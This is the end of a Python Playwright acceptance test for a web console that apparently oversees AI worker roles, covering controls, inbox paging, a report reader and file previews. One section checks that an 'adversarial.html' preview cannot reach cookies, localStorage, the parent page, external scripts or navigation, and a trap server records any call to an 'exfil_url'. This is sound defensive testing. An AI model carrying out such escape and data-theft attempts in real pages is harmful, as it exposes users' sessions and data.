                expect(page.locator("#stop-firm")).to_be_disabled()
                expect(page.locator("#force-stop-firm")).to_be_enabled()
                with page.expect_response(
                    lambda r: r.url.endswith("/api/control/force-stop")
                ) as force:
                    control_action("force-stop")
                assert force.value.status == 200
                assert runtime.status()["state"] == "stopping"
                expect(page.locator("#force-stop-firm")).to_be_disabled()
                runtime.finish(activation.activation_id, outcome="interrupted")
                page.locator("#refresh").evaluate("node => node.click()")
                expect(page.locator("#resume-firm")).to_be_enabled()
                assert control.calls == ["resume", "stop", "resume", "stop", "force-stop"]
                evidence["checks"]["force_stop_dialog_confirmation"] = {"passed": True}
                evidence["checks"]["force_stop_while_draining"] = {"passed": True}

                navigate("system")
                if not page.locator("#analysis").evaluate("node => node.open"):
                    page.locator("#analysis summary").click()
                page.locator('#analysis-tabs button[data-section="readiness"]').click()
                navigate("overview")
                navigate("system")
                expect(
                    page.locator('#analysis-tabs button[data-section="readiness"]')
                ).to_have_attribute("aria-pressed", "true")
                evidence["checks"]["persistent_analysis_panel"] = {"passed": True}
                expect(page.locator('#analysis-tabs button[data-section="mac"]')).to_be_hidden()
                page.locator("#analysis > summary").click()
                page.locator("#history > summary").click()
                for title in (
                    "Decisions", "Incidents", "Stops and drains", "Failed work periods",
                    "GitHub", "Model sessions",
                ):
                    section = page.locator("#history .history-section").filter(
                        has=page.locator("summary", has_text=re.compile(f"^{title}$"))
                    )
                    section.locator(":scope > summary").click()
                    assert section.inner_text().strip() != title, f"Empty history section: {title}"
                expect(page.locator("#decision-history")).to_contain_text("synthetic/resource-1")
                expect(page.locator("#decision-history")).to_contain_text("by you")
                expect(page.locator("#incident-history")).to_contain_text("cleared by you")
                screenshot_destination("system")
                evidence["checks"]["system_history_sections_and_attribution"] = {"passed": True}

                navigate("inbox")
                page.locator('#inbox-views button[data-view="all"]').click()
                report = page.locator("#messages .message-card").filter(
                    has_text="Opportunity shortlist report delivered"
                )
                chip = report.locator(".attachment-chip")
                expect(chip.get_by_role("link", name="Download")).to_be_visible()
                chip.get_by_role("link", name="Read", exact=True).click()
                expect(page.locator("#result-reader")).to_be_visible()
                markdown = page.frame_locator("#reader-frame")
                expect(markdown.get_by_role(
                    "heading", name="Opportunity shortlist report"
                )).to_be_visible()
                expect(markdown.get_by_role("table")).to_be_visible()
                expect(markdown.get_by_role("cell", name="Customs brokerage")).to_be_visible()
                expect(markdown.locator("script, #raw-html")).to_have_count(0)
                expect(markdown.locator("body")).not_to_have_attribute("data-markdown-script-ran")
                expect(page.locator("#reader-frame")).to_have_attribute("sandbox", "")
                expect(page.locator("#reader-about")).to_contain_text(
                    "Opportunity shortlist report delivered"
                )
                read_link = page.locator("#result-list").get_by_role("link", name="Read")
                read_link.focus()
                read_handle = read_link.element_handle()
                frame_handle = page.locator("#reader-frame").element_handle()
                runtime.messaging.send(
                    analyst, [OWNER], "Sharing this report again for reference.",
                    subject="Report shared again",
                    attachments=[
                        f"{Layout.for_role(sandbox_role_id(analyst)).drive}/"
                        "org/founder/analyst/work/opportunity-shortlist.md"
                    ],
                    request_id="browser-report-again",
                )
                expect(page.locator("#reader-about")).to_contain_text("Report shared again")
                expect(page.locator("#result-list .result-card").first).to_contain_text(
                    "Report shared again"
                )
                assert read_handle.evaluate("node => node === document.activeElement")
                assert frame_handle.evaluate("node => node.isConnected")
                about = page.locator("#reader-about")
                expect(about.locator("details")).to_have_count(1)
                expect(about.locator("summary")).to_have_text("Technical details")
                details = about.locator("details")
                expect(details).not_to_have_attribute("open")
                details_text = details.text_content()
                assert "Path: org/founder/analyst/work/opportunity-shortlist.md" in details_text
                deliveries = page.request.get(base + "/api/results").json()["results"]
                assert len(deliveries) == 2
                for delivery in deliveries:
                    assert delivery["message_id"] in details_text
                    assert delivery["conversation_id"] in details_text
                expect(about.get_by_role("link", name="Report shared again")).to_be_visible()
                for height in (750, 1000):
                    page.set_viewport_size({"width": 1440, "height": height})
                    frame_height = page.locator("#reader-frame").evaluate(
                        "frame => frame.getBoundingClientRect().height"
                    )
                    assert abs(frame_height - height * 0.8) <= 2
                evidence["checks"]["reader_single_disclosure_and_viewport_height"] = {
                    "passed": True,
                }
                evidence["checks"]["result_refresh_preserves_focus_and_preview"] = {
                    "passed": True,
                }
                page.get_by_role("button", name="Write a follow-up").click()
                expect(page.locator("#results-composer #send-body")).to_be_focused()
                expect(page.locator("#send-attachment")).to_have_text(
                    "Attached: opportunity-shortlist.md"
                )
                page.locator("#send-body").fill("Expand the customs brokerage evidence.")
                screenshot_destination("results-reader")
                with page.expect_response(
                    lambda response: response.url.endswith("/api/messages/reply")
                ) as followup:
                    page.locator("#send-form button[type=submit]").click()
                assert followup.value.status == 200, followup.value.text()
                sent_id = followup.value.json()["message_id"]
                sent = runtime.messaging.messages(analyst, [sent_id])["messages"][0]
                assert sent["body"] == "Expand the customs brokerage evidence."
                assert sent["attachments"] == [{
                    "path": "org/founder/analyst/work", "name": "opportunity-shortlist.md",
                }]
                source = runtime.messaging.messages(analyst, [sent["reply_to"]])["messages"][0]
                assert sent["conversation_id"] == source["conversation_id"]
                assert source["subject"] == "Opportunity shortlist report delivered"
                evidence["checks"]["markdown_reader_and_attached_followup"] = {"passed": True}
                page.locator("#reader-about").get_by_role(
                    "link", name="Opportunity shortlist report delivered"
                ).click()
                delivered_card = page.locator(
                    f'#messages [data-message-id="{source["message_id"]}"]'
                )
                expect(delivered_card).to_be_focused()
                expect(delivered_card.locator(".badge")).to_have_text("Done")
                page.go_back()
                expect(page.locator("#result-reader")).to_be_visible()
                expect(page.frame_locator("#reader-frame").get_by_role(
                    "heading", name="Opportunity shortlist report"
                )).to_be_visible()
                evidence["checks"]["result_delivery_link_and_reader_back_navigation"] = {
                    "passed": True,
                }

                navigate("overview")
                navigate("results")
                page.locator("#file-root").select_option("org/founder/analyst/work")
                page.locator("#browse-files").click()
                expect(page.locator("#file-list")).to_contain_text("inline.html")
                screenshot_destination("results")
                with page.expect_download() as download_info:
                    page.locator(".file-entry").filter(has_text="download.txt").get_by_role(
                        "link", name="Download"
                    ).click()
                download = download_info.value
                downloaded_path = Path(temp) / "downloaded.txt"
                download.save_as(downloaded_path)
                assert downloaded_path.read_bytes() == b"synthetic attachment payload\n"
                evidence["checks"]["file_navigation_download"] = {
                    "passed": True,
                    "download_name": download.suggested_filename,
                }

                inline = page.locator(".file-entry").filter(has_text="inline.html")
                inline.get_by_role("button", name="Preview").click()
                frame = page.frame_locator("#artifact-frame")
                expect(frame.locator("#result")).to_have_text("inline script executed")
                expect(frame.locator("body")).to_have_attribute("data-parent-blocked", "true")
                expect(frame.locator("body")).to_have_attribute("data-storage-blocked", "true")
                expect(frame.locator("body")).to_have_attribute("data-cookie-blocked", "true")
                evidence["checks"]["isolated_inline_preview"] = {"passed": True}
                page.go_back()
                expect(page.locator("#route-overview")).to_be_visible()
                expect(page.locator("dialog:modal")).to_have_count(0)
                expect(page.locator("#artifact-frame")).to_have_attribute("src", "about:blank")
                navigate("results")
                evidence["checks"]["back_from_preview_closes_modal_and_clears_frame"] = {
                    "passed": True
                }

                hostile = page.locator(".file-entry").filter(has_text="adversarial.html")
                hostile.get_by_role("button", name="Preview").click()
                frame = page.frame_locator("#artifact-frame")
                expect(frame.locator("#attack")).to_have_text("adversarial preview")
                page.wait_for_timeout(300)
                assert page.url == base + "/#results", page.url
                assert not evidence["popups"], evidence["popups"]
                expect(frame.locator("body")).not_to_have_attribute("data-external-script-ran")
                assert not _TrapHandler.hits, _TrapHandler.hits
                assert evidence["external_requests"] == [f"{exfil_url}/external-script"], evidence[
                    "external_requests"
                ]
                assert any("script-src 'unsafe-inline'" in line for line in evidence["console"]), (
                    evidence["console"]
                )
                assert any("connect-src 'none'" in line for line in evidence["console"]), evidence[
                    "console"
                ]
                assert any("allow-forms" in line for line in evidence["console"]), evidence[
                    "console"
                ]
                assert any("allow-popups" in line for line in evidence["console"]), evidence[
                    "console"
                ]
                frame.locator("#external-anchor").click()
                page.wait_for_timeout(300)
                assert page.url == base + "/#results", page.url
                assert not evidence["popups"], evidence["popups"]
                assert not _TrapHandler.hits, _TrapHandler.hits
                frame.locator("#self-anchor").click()
                page.wait_for_timeout(300)
                assert page.url == base + "/#results", page.url
                assert not evidence["popups"], evidence["popups"]
                assert not _TrapHandler.hits, _TrapHandler.hits
                assert evidence["frame_navigations"][-1] == "chrome-error://chromewebdata/", (
                    evidence["frame_navigations"]
                )
                assert any("frame-src" in line for line in evidence["console"]), evidence["console"]

                page.locator("#artifact-close").click()
                meta = page.locator(".file-entry").filter(has_text="meta-refresh.html")
                meta.get_by_role("button", name="Preview").click()
                frame = page.frame_locator("#artifact-frame")
                expect(frame.locator("#meta")).to_have_text("meta refresh test")
                page.wait_for_timeout(1300)
                assert page.url == base + "/#results", page.url
                assert evidence["frame_navigations"][-1] == "chrome-error://chromewebdata/", (
                    evidence["frame_navigations"]
                )
                assert any(
                    "meta-refresh-target" in line and "frame-src" in line
                    for line in evidence["console"]
                ), evidence["console"]
                evidence["checks"]["adversarial_preview_boundaries"] = {
                    "passed": True,
                    "attempts": [
                        "parent DOM",
                        "cookie",
                        "localStorage",
                        "fetch",
                        "external script",
                        "form",
                        "popup",
                        "top navigation",
                        "meta refresh",
                        "iframe self-navigation",
                        "external anchor",
                    ],
                    "browser_external_request_events": evidence["external_requests"],
                    "external_http_trap_hits": _TrapHandler.hits.copy(),
                    "popups": evidence["popups"],
                    "preview_frame_navigations": evidence["frame_navigations"],
                    "navigation_guard": "parent frame-src allowlist and opaque iframe sandbox",
                    "csp_diagnostics": sorted(
                        {
                            line
                            for line in evidence["console"]
                            if "Content-Security-Policy" in line
                            or "Content Security Policy" in line
                            or "navigate-to" in line
                        }
                    ),
                }
                if args.screenshot:
                    if page.locator("#artifact-dialog").is_visible():
                        page.locator("#artifact-close").click()
                    navigate("overview")
                    page.evaluate("window.scrollTo(0, 0)")
                    args.screenshot.parent.mkdir(parents=True, exist_ok=True)
                    page.screenshot(path=str(args.screenshot), full_page=True)
                if page.locator("#artifact-dialog").is_visible():
                    page.locator("#artifact-close").click()
                with page.expect_response(lambda r: r.url.endswith("/api/control/close")) as closed:
                    control_action("close")
                assert closed.value.status == 202
                assert control.calls[-1] == "close"
                evidence["checks"]["close_dialog_confirmation"] = {"passed": True}

                # A notice's current status must survive falling out of recent decisions.
                with runtime.store.transaction() as db:
                    request = runtime.requests.ask_owner(
                        db, {"employee_id": analyst, "activation_id": None},
                        "browser_acceptance", "synthetic/old-access", "Status probe", "review",
                    )
                    request_row = runtime.requests.pending(db, request["request_id"])
                    runtime.messaging.notice(
                        db, [OWNER], "Immutable access notice.", subject="Old access status probe",
                        regarding={"kind": "request", "id": request["request_id"]},
                    )
                navigate("inbox")
                page.locator('#inbox-views button[data-view="all"]').click()
                request_notice = page.locator("#messages .message-card").filter(
                    has_text="Old access status probe"
                )
                expect(request_notice.locator(".request-status")).to_have_text(
                    "Request now: Pending"
                )
                for status in ("granted", "denied", "withdrawn"):
                    with runtime.store.transaction() as db:
                        runtime.requests.answer(db, [request_row], status, decided_by="owner")
                        if status == "withdrawn":
                            for index in range(50):
                                newer = runtime.requests.ask_owner(
                                    db, {"employee_id": analyst, "activation_id": None},
                                    "browser_acceptance", f"synthetic/newer-{index}",
                                    "Newer decision", "review",
                                )
                                runtime.requests.answer(
                                    db, [runtime.requests.pending(db, newer["request_id"])],
                                    "withdrawn", decided_by="runtime",
                                )
                    page.locator("#refresh").evaluate("node => node.click()")
                    expect(request_notice.locator(".request-status")).to_have_text(
                        f"Request now: {status.capitalize()}"
                    )
                    expect(request_notice.locator(".message-body")).to_have_text(
                        "Immutable access notice."
                    )
                recent = page.request.get(base + "/api/requests").json()["recent"]
                assert len(recent) == 50
                assert request["request_id"] not in {item["request_id"] for item in recent}
                evidence["checks"]["request_notice_status_outside_recent_decisions"] = {
                    "passed": True, "newer_decisions": 50,
                    "statuses": ["pending", "granted", "denied", "withdrawn"],
                }

                # A separate page supplies a bounded mail fixture so paging probes do not
                # bury the main fixture's history, conversations, or screenshots.
                envelope = page.evaluate(
                    "async () => (await (await fetch('/api/inbox?view=all&limit=1')).json())"
                    ".messages[0]"
                )
                window_messages = []
                for index in range(205):
                    message = json.loads(json.dumps(envelope))
                    message.update(
                        message_id=f"window-{index:03d}",
                        sequence=1000 - index,
                        conversation_id="window-conversation",
                        subject=f"Window message {index}",
                        body="A long message. " * 80 if index == 0 else f"Body {index}",
                        created_at=time.time() - index,
                        author={"employee_id": analyst, "address": "founder/analyst"},
                        owner_delivery={"disposition": "pending", "disposition_at": None},
                        regarding=None,
                    )
                    window_messages.append(message)
                window_messages[170].update(
                    author={"employee_id": "runtime", "address": "runtime"},
                    regarding={
                        "kind": "incident", "id": "window-incident", "status": "open",
                        "resolved_at": None, "resolved_by": None,
                    },
                )
                window_calls = []

                def serve_window(route):
                    params = parse_qs(urlsplit(route.request.url).query)
                    limit = int(params.get("limit", ["50"])[0])
                    before = int(params.get("before", ["0"])[0])
                    window_calls.append((limit, before))
                    view = params.get("view", ["new"])[0]
                    eligible = [
                        message for message in window_messages
                        if view == "all" or message["owner_delivery"]["disposition"]
                        == ("pending" if view == "new" else "dismissed")
                    ]
                    end = before + limit
                    route.fulfill(json={
                        "messages": eligible[before:end],
                        "next_cursor": str(end) if end < len(eligible) else None,
                    })

                window_page = browser.new_page(viewport={"width": 1440, "height": 1000})
                window_page.route("**/api/inbox?**", serve_window)
                window_page.goto(
                    f"{base}/unlock/{app.state.console_key}", wait_until="networkidle"
                )
                # Keyboard activation does not let Playwright scroll the editor for us.
                overview_reply = window_page.locator(
                    '#owner-mail [data-message-id="window-020"]'
                ).get_by_role("button", name="Reply", exact=True)
                overview_reply.focus()
                overview_reply.press("Enter")
                window_page.wait_for_load_state("networkidle")
                editor = window_page.locator("#send-body")
                expect(editor).to_be_focused()
                assert_in_viewport(editor)
                assert window_page.evaluate("scrollY") > 1000
                evidence["checks"]["keyboard_overview_reply_long_feed_focus_and_viewport"] = {
                    "passed": True,
                }
                window_page.locator("#cancel-reply").click()
                window_page.locator('#inbox-views button[data-view="new"]').click()
                target = window_page.locator('#messages [data-message-id="window-020"]')
                target.get_by_role("button", name="Reply", exact=True).press("Enter")
                expect(editor).to_be_focused()
                editor.fill("Draft survives the target leaving New")
                editor.evaluate("node => node.setSelectionRange(6, 14, 'backward')")
                editor_top = editor.bounding_box()["y"]
                window_messages[20]["owner_delivery"].update(
                    disposition="dismissed", disposition_at=time.time()
                )
                # Let the normal poll remove the target, without touching focus or scroll.
                expect(target).to_have_count(0, timeout=10000)
                expect(editor).to_be_focused()
                expect(editor).to_have_value("Draft survives the target leaving New")
                assert editor.evaluate(
                    "node => [node.selectionStart, node.selectionEnd, node.selectionDirection]"
                ) == [6, 14, "backward"]
                assert_in_viewport(editor)
                # At the end of the page the browser can clamp scrollY; otherwise the
                # editor keeps its exact viewport position after being reparented.
                assert abs(editor.bounding_box()["y"] - editor_top) < 2 or window_page.evaluate(
                    "Math.abs(scrollY + innerHeight - document.documentElement.scrollHeight) < 2"
                ), {"before": editor_top, "after": editor.bounding_box()["y"]}
                evidence["checks"]["reply_target_leaves_new_preserves_editor_and_viewport"] = {
                    "passed": True,
                }
                window_page.locator("#cancel-reply").click()
                window_page.locator('#inbox-views button[data-view="all"]').click()
                window_cards = window_page.locator("#messages .message-card")
                expect(window_cards).to_have_count(50)
                long_card = window_page.locator('#messages [data-message-id="window-000"]')
                long_body = long_card.locator(".message-body")
                assert len(long_body.inner_text()) < len(window_messages[0]["body"])
                long_toggle = long_card.get_by_role("button", name="Show full message")
                long_toggle.click()
                expect(long_body).to_have_text(window_messages[0]["body"])
                for count in (100, 150, 200):
                    window_page.locator("#inbox-more").click()
                    expect(window_cards).to_have_count(count)
                expect(window_page.locator("#inbox-more")).to_be_hidden()
                long_toggle = long_card.get_by_role("button", name="Show less", exact=True)
                long_toggle.focus()
                older_card = window_page.locator('#messages [data-message-id="window-175"]')
                expect(older_card.locator(".badge")).to_have_text("New")
                window_messages[175]["owner_delivery"].update(
                    disposition="dismissed", disposition_at=time.time()
                )
                window_messages[170]["regarding"].update(
                    status="resolved", resolved_at=time.time(), resolved_by="owner"
                )
                calls_before_refresh = len(window_calls)
                window_page.locator("#refresh").evaluate("node => node.click()")
                expect(older_card.locator(".badge")).to_have_text("Done")
                expect(window_page.locator(".incident-status:visible")).to_contain_text(
                    "cleared by you"
                )
                assert window_calls[calls_before_refresh:calls_before_refresh + 2] == [
                    (100, 0), (100, 100)
                ], window_calls
                expect(window_cards).to_have_count(200)
                expect(long_body).to_have_text(window_messages[0]["body"])
                expect(long_toggle).to_be_focused()
                expect(long_toggle).to_have_attribute("aria-expanded", "true")
                stamp = long_card.locator("time")
                expect(stamp).to_have_text(re.compile(r"^\d{2}:\d{2}$"))
                stamp_handle = stamp.element_handle()
                window_page.clock.set_fixed_time((time.time() + 86400) * 1000)
                expected_date = stamp.evaluate(
                    "node => new Date(Number(node.dataset.timestamp) * 1000).toLocaleDateString()"
                )
                expect(stamp).to_contain_text(expected_date)
                assert stamp_handle.evaluate("node => node.isConnected")
                evidence["checks"]["retained_message_timestamp_refreshes_across_midnight"] = {
                    "passed": True,
                }
                window_page.close()
                evidence["checks"]["inbox_loaded_window_replaced_and_long_body_persists"] = {
                    "passed": True, "loaded_messages": 200,
                    "refreshed_pages": [[100, 0], [100, 100]],
                }

                # Exercise the real API with excluded messages ahead of eligible role mail.
                founder = page.evaluate(
                    "async () => (await (await fetch('/api/snapshot')).json())"
                    ".roles.find(role => role.address === 'founder').employee_id"
                )
                for index in range(60):
                    runtime.messaging.send(
                        analyst, [founder], f"Mixed-source role mail {index}",
                        subject=f"Mixed-source role mail {index}", request_id=f"mixed-role-{index}",
                    )
                dismissed_ids = [
                    runtime.messaging.send(
                        analyst, [OWNER], f"Excluded owner mail {index}",
                        subject=f"Excluded owner mail {index}", request_id=f"mixed-owner-{index}",
                    )["message_id"]
                    for index in range(210)
                ]
                for offset in range(0, len(dismissed_ids), 100):
                    runtime.messaging.dismiss(
                        OWNER, dismissed_ids[offset:offset + 100],
                        request_id=f"mixed-dismiss-{offset}",
                    )
                runtime.messaging.send(
                    analyst, [OWNER], "Mixed-source pending owner mail",
                    subject="Mixed-source pending owner mail", request_id="mixed-pending",
                )
                mixed = browser.new_page(viewport={"width": 1440, "height": 1000})
                mixed.goto(f"{base}/unlock/{app.state.console_key}", wait_until="networkidle")
                mixed.locator('#destinations a[href="#inbox"]').click()
                mixed.locator("#include-role-mail").check()
                expect(mixed.locator("#messages .message-card")).to_have_count(50)
                expect(mixed.locator("#messages")).to_contain_text("Mixed-source role mail 59")
                expect(mixed.locator("#messages")).to_contain_text(
                    "Mixed-source pending owner mail"
                )
                expect(mixed.locator("#messages")).not_to_contain_text("Excluded owner mail")
                mixed.locator("#inbox-more").click()
                expect(mixed.locator("#messages .message-card").filter(
                    has_text="Mixed-source role mail"
                )).to_have_count(60)
                expect(mixed.locator("#messages")).to_contain_text("Mixed-source role mail 0")
                expect(mixed.locator("#messages")).not_to_contain_text("Excluded owner mail")
                mixed.close()
                evidence["checks"]["mixed_source_paging_excludes_210_dismissed_owner_messages"] = {
                    "passed": True, "eligible_role_messages": 60,
                }

                configured_snapshot = page.evaluate(
                    "async () => (await fetch('/api/snapshot')).json()"
                )
                configured_snapshot["mac"] = {"configured": True, "stations": []}
                configured_snapshot["accounts"]["accounts"] = [{
                    "account_id": "synthetic-account", "provider": "codex",
                    "active": 0, "max_active": 2, "isolated": 0,
                    "subscription_quota": {
                        "state": "fresh", "observed_at": time.time(),
                        "checked_at": time.time(), "polled": True,
                        "windows": [{
                            "label": "Weekly", "used_percent": 20,
                            "resets_at": time.time() + 86400, "expired": False,
                        }],
                    },
                }]
                configured_network = page.evaluate(
                    "async () => (await fetch('/api/analysis/network?limit=200')).json()"
                )
                configured_network["allowed_hosts"] = [
                    {"host": "example.org", "source": "configured"}
                ]
                configured_page = browser.new_page()
                configured_page.route(
                    "**/api/snapshot", lambda route: route.fulfill(json=configured_snapshot)
                )
                configured_page.route(
                    "**/api/analysis/network?**",
                    lambda route: route.fulfill(json=configured_network),
                )
                configured_page.goto(
                    f"{base}/unlock/{app.state.console_key}", wait_until="networkidle"
                )
                configured_page.locator('#destinations a[href="#system"]').click()
                configured_page.locator("#analysis > summary").click()
                mac_tab = configured_page.locator('#analysis-tabs [data-section="mac"]')
                expect(mac_tab).to_be_visible()
                with configured_page.expect_response(
                    lambda r: "/api/analysis/mac?" in r.url
                ) as mac_response:
                    mac_tab.click()
                assert mac_response.value.status == 200
                expect(configured_page.locator("#analysis-content")).to_contain_text(
                    "No recorded observations in this selection."
                )
                expect(configured_page.locator("#analysis-status")).not_to_contain_text(
                    "Analysis failed"
                )
                evidence["checks"]["configured_mac_diagnostics_empty_state"] = {"passed": True}

                account = configured_page.locator("#accounts .account-card").filter(
                    has_text="synthetic-account"
                )
                quota_details = account.locator(".technical-details")
                quota_details.locator("summary").click()
                quota_details.locator("summary").focus()
                quota = configured_snapshot["accounts"]["accounts"][0]["subscription_quota"]
                quota["windows"][0]["used_percent"] = 45
                configured_page.locator("#refresh").evaluate("node => node.click()")
                expect(account.locator(".quota-windows")).to_contain_text("45% used")
                expect(quota_details).to_have_attribute("open", "")
                expect(quota_details.locator("summary")).to_be_focused()
                hosts = configured_page.locator('#network-details [data-system-key="hosts"]')
                hosts.locator("summary").click()
                hosts.locator("summary").focus()
                configured_network["allowed_hosts"].append(
                    {"host": "example.net", "source": "configured"}
                )
                configured_page.locator("#refresh").evaluate("node => node.click()")
                expect(hosts.locator("summary")).to_have_text("Listed hosts (2)")
                expect(hosts).to_contain_text("example.net")
                expect(hosts).to_have_attribute("open", "")
                expect(hosts.locator("summary")).to_be_focused()
                configured_page.close()
                evidence["checks"]["system_disclosures_preserve_open_and_focus_on_updates"] = {
                    "passed": True
                }
                browser.close()
        finally:
            server.should_exit = True
            thread.join(timeout=5)
            trap_server.shutdown()
            trap_thread.join(timeout=5)
        evidence["result"] = "passed"
        evidence["console_diagnostics"] = sorted(set(evidence.pop("console")))
        print(json.dumps(evidence, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
